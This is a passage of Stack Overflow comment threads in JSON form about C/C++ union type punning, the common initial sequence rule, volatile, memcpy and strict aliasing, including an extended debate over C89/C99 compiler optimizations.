"https://stackoverflow.com/users/556899/stgatilov"}, "edited": false, "score": 1, "creation_date": 1437562363, "post_id": 31553409, "comment_id": 51077905, "body": "@stgatilov: I can imagine optimizations breaking this unless you declare the union of <code>volatile struct...</code> - changes to one structure cached in registers, not flushed to RAM, then the (old) RAM values read through the &quot;other side&quot;."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 12300, "user_id": 249618, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/81060fe344980bc9a3273a48b8f3e31c?s=128&d=identicon&r=PG", "display_name": "SF.", "link": "https://stackoverflow.com/users/249618/sf"}, "edited": false, "score": 1, "creation_date": 1437610997, "post_id": 31553409, "comment_id": 51106969, "body": "@SF. Based on how the standard defines &quot;union&quot;, that isn&#39;t a concern. Also, declaring a type &quot;volatile&quot; does not make it thread safe or atomic."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 12300, "user_id": 249618, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/81060fe344980bc9a3273a48b8f3e31c?s=128&d=identicon&r=PG", "display_name": "SF.", "link": "https://stackoverflow.com/users/249618/sf"}, "edited": false, "score": 0, "creation_date": 1437647957, "post_id": 31553409, "comment_id": 51122080, "body": "@SF. Proper handling of the common initial sequence is guaranteed by the standard and any optimization that breaks that rule is a defect."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 12300, "user_id": 249618, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/81060fe344980bc9a3273a48b8f3e31c?s=128&d=identicon&r=PG", "display_name": "SF.", "link": "https://stackoverflow.com/users/249618/sf"}, "edited": false, "score": 0, "creation_date": 1437648031, "post_id": 31553409, "comment_id": 51122123, "body": "@SF. Conversion from uint64_t to uint8_t isn&#39;t going to &quot;work&quot; no matter what the compiler does and it&#39;s out of the scope of this question."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 12300, "user_id": 249618, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/81060fe344980bc9a3273a48b8f3e31c?s=128&d=identicon&r=PG", "display_name": "SF.", "link": "https://stackoverflow.com/users/249618/sf"}, "edited": false, "score": 0, "creation_date": 1437648187, "post_id": 31553409, "comment_id": 51122233, "body": "@SF. You&#39;ve gone way off topic. This question isn&#39;t about anything you mentioned."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 12300, "user_id": 249618, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/81060fe344980bc9a3273a48b8f3e31c?s=128&d=identicon&r=PG", "display_name": "SF.", "link": "https://stackoverflow.com/users/249618/sf"}, "edited": false, "score": 1, "creation_date": 1437648755, "post_id": 31553409, "comment_id": 51122608, "body": "@SF. I was pointing out that your understanding of how the volatile modifier works is incorrect because I don&#39;t want other readers to be confused by your comments."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "reply_to_user": {"reputation": 12300, "user_id": 249618, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/81060fe344980bc9a3273a48b8f3e31c?s=128&d=identicon&r=PG", "display_name": "SF.", "link": "https://stackoverflow.com/users/249618/sf"}, "edited": false, "score": 1, "creation_date": 1437649779, "post_id": 31553409, "comment_id": 51123324, "body": "@SF. I&#39;m simply saying that your suggestion to use &quot;volatile&quot; to ensure atomic behavior is incorrect. see: <a href=\"http://stackoverflow.com/questions/6627596/is-volatile-int-in-c-as-good-as-stdatomicint-of-c0x\" title=\"is volatile int in c as good as stdatomicint of c0x\">stackoverflow.com/questions/6627596/&hellip;</a>. That is a better place for future comments."}, {"owner": {"reputation": 12300, "user_id": 249618, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/81060fe344980bc9a3273a48b8f3e31c?s=128&d=identicon&r=PG", "display_name": "SF.", "link": "https://stackoverflow.com/users/249618/sf"}, "edited": false, "score": 0, "creation_date": 1437650733, "post_id": 31553409, "comment_id": 51123959, "body": "@Codorilla: @Codorilla: That&#39;s STILL about a multi-threaded system. A write to a variable in a <i>single thread</i> program is guaranteed to be atomic: <code>int a = 5; a = 10; printf(&quot;%d&quot;,a)</code> - you will never get &quot;anything else than &quot;10&quot; as result because the system guarantees the write will end (for all practical purposes) before the next command. This won&#39;t work with writing to memory underlying the variable. <code>const int a=5; int* b = (int*) &amp;a; *b = 10; printf(&quot;%d&quot;,a);</code>.  You&#39;re most likely getting a &quot;5&quot;. But make <code>volatile const int a</code> and the atomicity within a single thread is enforced."}], "answers": [{"comments": [{"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "edited": false, "score": 0, "creation_date": 1437554269, "post_id": 31557852, "comment_id": 51072354, "body": "Can you provide links for your sources?"}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "edited": false, "score": 0, "creation_date": 1437554374, "post_id": 31557852, "comment_id": 51072411, "body": "@Codorilla see <a href=\"http://stackoverflow.com/questions/81656/where-do-i-find-the-current-c-or-c-standard-documents\" title=\"where do i find the current c or c standard documents\">stackoverflow.com/questions/81656/&hellip;</a>"}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "edited": false, "score": 0, "creation_date": 1437554587, "post_id": 31557852, "comment_id": 51072543, "body": "As a follow up, do you see any advantage of using a union in the case versus memcpy? When I profiled the code in release mode, the assembly was the same whether I used union or memcpy. But, this is a simple case. I wonder if the result would be the same in a real world use case."}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "edited": false, "score": 1, "creation_date": 1437555098, "post_id": 31557852, "comment_id": 51072867, "body": "@Codorilla personally, I&#39;d reserve memcpy for the case where you&#39;re converting between members of different types; I&#39;d be surprised to see memcpy used in code where the union method is allowed. As you say an optimising compiler can &quot;see through&quot; the memcpy, but you aren&#39;t always running optimised code - it would get in the way when stepping through a debug build."}, {"owner": {"reputation": 333, "user_id": 3638462, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/aeb6323b49bc558b0d61ee7e0a9f0ebe?s=128&d=identicon&r=PG&f=1", "display_name": "Coder", "link": "https://stackoverflow.com/users/3638462/coder"}, "edited": false, "score": 1, "creation_date": 1437555304, "post_id": 31557852, "comment_id": 51073005, "body": "There&#39;s also the issue of the behavior of union being well defined while it&#39;s implementation defined whether the use of memcpy is as efficient. The profiled assembly in debug mode makes that clear. Using union in this case carries stronger performance guarantees across platforms."}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1452006568, "post_id": 31557852, "comment_id": 56975119, "body": "It&#39;s interesting - and perhaps notable, though I don&#39;t know whether I <i>want</i> it to be... - that while C has the clause about a requirement for some ill-defined &#39;visible declaration&#39; of the union, C++ (including as of 14) does not make any such stipulation."}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 1, "creation_date": 1452007048, "post_id": 31557852, "comment_id": 56975475, "body": "@underscore_d I&#39;d imagine it permits more aggressive optimization; C can assume that function arguments <code>S* s</code> and <code>T* t</code> do not alias even if they share a common initial sequence as long as no <code>union { S; T; }</code> is in view, while C++ can make that assumption only at link time. Might be worth asking a separate question about that difference."}, {"owner": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1452007876, "post_id": 31557852, "comment_id": 56976066, "body": "Interesting idea! (Assuming the difference is intentional.) I think I will. I&#39;m sure it&#39;s OK just to &#39;quote your quotes&#39; and link back here?"}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 5304, "user_id": 2757035, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/fade5daafd5717576b33f2e08f4f9429?s=128&d=identicon&r=PG&f=1", "display_name": "underscore_d", "link": "https://stackoverflow.com/users/2757035/underscore-d"}, "edited": false, "score": 0, "creation_date": 1452008500, "post_id": 31557852, "comment_id": 56976492, "body": "@underscore_d sure, no problem"}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473199223, "post_id": 31557852, "comment_id": 66046821, "body": "@ecatmur: I would agree that the clear intention of the Standard&#39;s mention of the <i>complete</i> union declaration is to permit programmers to write functions that can accept pointers to many structure types and operate upon members of their CIS, so long as they ensure that a union <i>declaration</i> is visible to let compilers know about the possible aliasing; in practice, gcc assumes that no aliasing will occur between pointers of different structure types will occur, even with members of the CIS of structures that appear within the same complete union declaration, making such code impossible..."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473199274, "post_id": 31557852, "comment_id": 66046835, "body": "...except via -fno-strict-aliasing or compiler-specific directives."}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473200417, "post_id": 31557852, "comment_id": 66047171, "body": "@supercat well, quite; the fact that compilers don&#39;t respect the visible-declaration rule puts a bit of a damper on things. underscore_d&#39;s excellent Q-and-A <a href=\"http://stackoverflow.com/a/34641113/567292\">stackoverflow.com/a/34641113/567292</a> says I think all that needs to be said (for now) about the visible-declaration rule."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473204260, "post_id": 31557852, "comment_id": 66048010, "body": "@ecatmur: That answer misses a major point: in the absence of the aliasing rules, the CIS rule would imply that a pointer to one structure type could be used to access members of another structure type&#39;s CIS; the usefulness of the CIS rule comes primarily from that.  The language gcc processes is thus a semantically-gutted version of the language Dennis Ritchie invented."}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473208173, "post_id": 31557852, "comment_id": 66048970, "body": "@supercat I don&#39;t think I agree; if Ritchie had meant types to be ignorable he&#39;d have stuck with B. We can still write plenty of useful and interesting programs staying within and respecting the type system, even with strict aliasing rules."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473258028, "post_id": 31557852, "comment_id": 66072744, "body": "@ecatmur: The CIS rule doesn&#39;t &quot;ignore&quot; types.  It makes it possible to perform some tasks more cleanly than would be possible in its absence.  If one wants to perform a task which would greatly benefit from the CIS rule, should one write nasty-looking code which computes field offsets manually rather than using structure types, decide to forego the desired task in favor of some other &quot;useful and interesting&quot; program, or find a compiler that supports the CIS rule?"}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473258256, "post_id": 31557852, "comment_id": 66072948, "body": "@supercat or alternatively, store and pass pointers to the complete union object rather than to its subobjects."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473258726, "post_id": 31557852, "comment_id": 66073373, "body": "@ecatmur: That only works if all structure types have the same alignment requirements.  Changing a function that should take a pointer to the type with the least-restrictive alignment so it uses the &quot;union&quot; type would make it unusable with any instances that don&#39;t satisfy the coarsest alignment type within the union."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473259061, "post_id": 31557852, "comment_id": 66073630, "body": "@ecatmur: The CIS guarantees predate aliasing rules, and their usefulness stemmed from what they implied about pointers to structure types that share a CIS.  Since the only plausible way a function that received pointers to two structures that shared a CIS could abide by the CIS rule would be able to honor the CIS rule if the structures happened to be part of a common union would be to honor the CIS rule for structure pointers, there was no perceived need to <i>redundantly</i> state the rule as applying to pointers."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473259935, "post_id": 31557852, "comment_id": 66074347, "body": "@ecatmur: A principle of concise spec writing is that if there would be no plausible reason why anyone would expect that something might conceivably do X, there&#39;s no need to waste ink promising that it won&#39;t do X.  Further, I don&#39;t think I&#39;ve seen any evidence that the authors of C89 intended that a decision not to mandate that a feature or guarantee be supported on even those platforms where it would be most expensive and least useful, should be interpreted as an invitation to drop support on platforms where it had shown itself to be practical and useful."}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473260210, "post_id": 31557852, "comment_id": 66074566, "body": "@supercat re. alignment: if you pass the union pointer, then every instance of the union satisfies its alignment. re. CIS/aliasing priority: if you say so; I don&#39;t have a copy of 1st edition K&amp;R to hand to check, and in any case that ship sailed nearly 30 years ago. re. UB exploitation: compiler writing is a competitive business so it could have been expected; I don&#39;t think the ANSI committee were naifs. You always have the option of dialing down optimization to get a compiler that conforms more closely to your own mental model."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473261320, "post_id": 31557852, "comment_id": 66075365, "body": "@ecatmur: C existed as a language prior to C89.  To ensure acceptance, it was necessary to write the Standard so that <i>existing</i> implementations that applied aliasing optimizations could continue to do so.  The idea that future optimizations should try to exploit allowances for antiquated implementations, rather than using new directives, is one of the worst ideas in programming-language history.  C became popular because it let programmers targeting a particular family of targets exploit features common to that family. How much of a performance hit should programmers be willing to tolerate..."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473261472, "post_id": 31557852, "comment_id": 66075445, "body": "...in the name of &quot;optimization&quot;?  I don&#39;t think the C89 authors were naifs or dishonest--unlike those who trash what should be a useful language for systems programming."}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473262433, "post_id": 31557852, "comment_id": 66076089, "body": "@supercat really, compiler vendors are dishonest because their products aren&#39;t suitable for your style of systems programming? I think we&#39;ve got far enough off topic here."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473262704, "post_id": 31557852, "comment_id": 66076287, "body": "@ecatmur: Compiler writers who claim to be C89 compatible while interpreting the rules in a fashion that would have been universally denounced as broken in 1989 are being dishonest.  Dennis Ritchie designed a language that allows user code to implement an efficient malloc/free with two prerequisites: (1) it must know what the coarsest alignment is; (2) it needs a pointer to one or more blocks of memory that satisfy that alignment, and are large enough to satisfy malloc() requests.  His book doesn&#39;t mention a third requirement: It must have a means of erasing the effective type..."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473262857, "post_id": 31557852, "comment_id": 66076389, "body": "...from a block of memory that is faster than physically erasing it.  Do you think the authors of C89 intended that malloc/free should be possible only on systems meeting the third prerequisite (which no compilers met), or do you think they intended the Standard to be interpreted in a fashion that would make Dennis Ritchie&#39;s <code>malloc</code> implementation work correctly with nothing more than his stated prerequisites?"}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473264047, "post_id": 31557852, "comment_id": 66077147, "body": "@supercat do any compilers actually prevent using a static array of character type as backing storage for user-supplied allocation functions? I hadn&#39;t heard of anything like that occurring."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473265395, "post_id": 31557852, "comment_id": 66077922, "body": "@ecatmur: The code <code>struct foo {unsigned char x;} *p,s; p=malloc(sizeof *p); s=*p;</code> is well-defined (assuming malloc returns non-null) no matter how the returned storage was previously used, since structure types have no trap representations.  The only for a malloc/free pair to make such code well-defined, however, is to ensure that all storage returned by &quot;malloc&quot; gets physically erased before making it available to user code."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473266878, "post_id": 31557852, "comment_id": 66078693, "body": "@ecatmur: It&#39;s not likely that compilers would find an &quot;optimization&quot; that would break such code, but the maintainers of gcc take the viewpoint that programmers who rely upon compilers not finding optimizations deserve what they get if future compilers do find them.  Actually, an even worse issue is that in C99, even on systems where <code>long</code> and <code>long long</code> have matching representations, using <code>memcpy</code> to copy from a <code>long</code> to allocated storage and later reading it with a <code>long long*</code> was clearly allowable under C89 but is just as clearly UB under C99."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473267305, "post_id": 31557852, "comment_id": 66078929, "body": "@ecatmur: In any case, returning to the original subject, the C99 rule regarding union-<i>type</i> visibility had a clear purpose which the authors of gcc have chosen to ignore.  There is a simple remedy for all of the aliasing-related problems: define directives to select aliasing modes.  That would make it possible for compilers to support optimizations beyond those presently allowed (e.g. disallow all aliasing, <i>including <code>char*</code></i>, except in places where code uses specific directives to indicate it) while supporting concepts which are needed in production code but have been..."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473267373, "post_id": 31557852, "comment_id": 66078963, "body": "...neglected by the Standard for years.  Unless the authors of the Standard are willing to recognize that different programs have different needs, however, it will be impossible to write code with any confidence that future versions of the Standard won&#39;t break it."}, {"owner": {"reputation": 137011, "user_id": 567292, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/b55da07dea89fa675c7e2894c77f8024?s=128&d=identicon&r=PG", "display_name": "ecatmur", "link": "https://stackoverflow.com/users/567292/ecatmur"}, "reply_to_user": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473267629, "post_id": 31557852, "comment_id": 66079100, "body": "@supercat so, standardizing <code>-fno-strict-aliasing</code>? Makes sense to me. However, the fact that things have come to this pass indicates one of two things: either the Standard committees are unrepresentative of the language&#39;s users, or they are representative and your use cases are too much of a minority niche to warrant representation."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473268863, "post_id": 31557852, "comment_id": 66079705, "body": "@ecatmur: From what I&#39;ve seen, <code>-fno-strict-alias</code> is pretty standard in project build files, but there should be no need to disable the type based optimizations that are easiest to find and--in most cases--offer the most benefit.  Requiring that the easy and harmless optimizations be disabled to ensure correct operation of code where aliasing should be considered obvious (e.g. if a function that receives a <code>uint16_t*</code> and casts it to <code>uint64_t*</code> to operate on groups of four values, such a function should be expected to modify things of type <code>uint16_t*</code>) is not a recipe for good performance."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473269093, "post_id": 31557852, "comment_id": 66079819, "body": "@ecatmur: As for the Committee, I think the real problem is a lack of clarity as to what it is supposed to be defining--is it supposed to be a <i>complete</i> spec for a reduced language that can write efficient code on commonplace platforms, or for a language which can be used on more obscure platforms but whose efficiency is impaired by the inability to use commonplace features?  Either could be useful, but what&#39;s happened is that the Committee defined the latter but compiler writers interpreted it as the former."}, {"owner": {"reputation": 69012, "user_id": 363751, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/135a97c4150691234931a93f3a27a52f?s=128&d=identicon&r=PG", "display_name": "supercat", "link": "https://stackoverflow.com/users/363751/supercat"}, "edited": false, "score": 0, "creation_date": 1473274007, "post_id": 31557852, "comment_id": 66082087, "body": "@ecatmur: Further, I would suggest that a proper standard should define useful classes of things such that 